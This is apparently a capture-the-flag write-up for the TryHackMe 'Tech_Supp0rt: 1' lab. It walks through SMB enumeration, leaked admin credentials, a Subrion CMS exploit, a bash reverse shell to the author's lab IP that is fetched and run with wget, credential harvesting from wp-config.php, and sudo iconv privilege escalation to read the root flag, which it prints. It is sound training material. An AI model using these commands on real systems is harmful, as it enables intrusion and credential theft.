# TryHackMe Tech_Supp0rt: 1 Writeup

## namp scan

```ruby
└─$ nmap -sCV 10.10.1.245
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 18:32 EDT
Nmap scan report for 10.10.1.245
Host is up (0.43s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m57s, deviation: 3h10m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2025-07-14T04:02:30+05:30
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-07-13T22:32:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.79 seconds

```

#### so ``smb`` is open

## ``enum4linux``

```
enum4linux -a 10.10.1.245
```

<img width="951" height="357" alt="image" src="https://github.com/user-attachments/assets/e0464585-c614-46c6-b088-8b9c93703d35" />

so found sharename ``websvr``

## smbclient

```
smbclient //10.10.1.245/websvr -N
```

<img width="949" height="242" alt="image" src="https://github.com/user-attachments/assets/39904ec6-aafd-45aa-8818-2aa4ec9ff822" />

found file ``enter.txt``

```
cat enter.txt 
```

```ruby
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->

```

``username : password``

```
admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
```

<img width="1539" height="871" alt="image" src="https://github.com/user-attachments/assets/b93e7871-7d72-4669-b0d0-a582c941a5f5" />

```
admin : Scam2021
```

now to see what in ``/subrion``

```
 gobuster dir -u http://10.10.1.245/subrion/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 301,302 -x php,html,txt 
```

<img width="1310" height="475" alt="image" src="https://github.com/user-attachments/assets/401cfb0a-f98f-4b1e-9781-4827b294263c" />

<img width="550" height="280" alt="image" src="https://github.com/user-attachments/assets/59b196b6-ee82-427b-8e27-e25c5437f0ff" />

```
http://10.10.1.245/subrion/panel/
```

<img width="1189" height="637" alt="image" src="https://github.com/user-attachments/assets/a9acc37b-1e56-4106-a759-c1e3301d3e60" />

<img width="1911" height="809" alt="image" src="https://github.com/user-attachments/assets/f2a38ace-fe3e-47f4-82cb-315028f1973b" />

now try to find vluns in ``subrion``

```
searchsploit subrion
searchsploit -m php/webapps/49876.py
```

<img width="1313" height="560" alt="image" src="https://github.com/user-attachments/assets/74c16fff-b295-4e47-a1de-919031c08f4d" />

now exploit ``49876.py``

```
python3 49876.py -u http://10.10.1.245/subrion/panel/ -l admin -p Scam2021
```

<img width="1052" height="396" alt="image" src="https://github.com/user-attachments/assets/99fcd097-36c3-4887-9a34-565e1c345978" />

but i can't out the current directory so i need to do reverse shell 

on my device create new file call ``shell.sh``

```
bash -i >& /dev/tcp/10.8.47.102/4444 0>&1
```

```
python3 -m http.server 8888
```

on server machine

```
wget http://10.8.47.102:8888/shell.sh
```

now :

```
bash shell.sh
```

```
nc -lvnp 4444
```

<img width="1064" height="505" alt="image" src="https://github.com/user-attachments/assets/e4b2a199-5e2c-459d-8e61-49059eb178de" />

in ``wordpress`` dir found ``wp-config.php``

<img width="638" height="417" alt="image" src="https://github.com/user-attachments/assets/3a703353-bda9-4b53-9455-694ace2232a2" />

in it found ``password``

<img width="911" height="605" alt="image" src="https://github.com/user-attachments/assets/a5810524-1eef-44fc-9822-725c17a110c2" />

```
ImAScammerLOL!123!
```

on this server there is only two users ``root`` & ``scamsite``

now try to switch to ``scamsite`` user:

```
su - scamsite
```

but there is problem 

<img width="980" height="63" alt="image" src="https://github.com/user-attachments/assets/a8c353ba-1ccc-4afc-ac3a-ee36eda8fee2" />

to slove this 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="989" height="142" alt="image" src="https://github.com/user-attachments/assets/342d7101-d9bb-4a0c-ac89-4bbbd35be67d" />

good now prevesc

```
sudo -l
```

<img width="946" height="161" alt="image" src="https://github.com/user-attachments/assets/47e101df-3db1-4c67-a48f-71ea05693e47" />

## [gtfobins](https://gtfobins.github.io/gtfobins/iconv/)

<img width="1031" height="227" alt="image" src="https://github.com/user-attachments/assets/c095dee9-b9db-4a64-b375-b7382a522df3" />

so file we wnat to read is ``/root/root.txt``

```
LFILE=/root/root.txt
sudo /usr/bin/iconv -f utf-8 -t utf-8 /root/root.txt
```

```
851b8233a8c09400ec30651bd1529bf1ed02790b
```

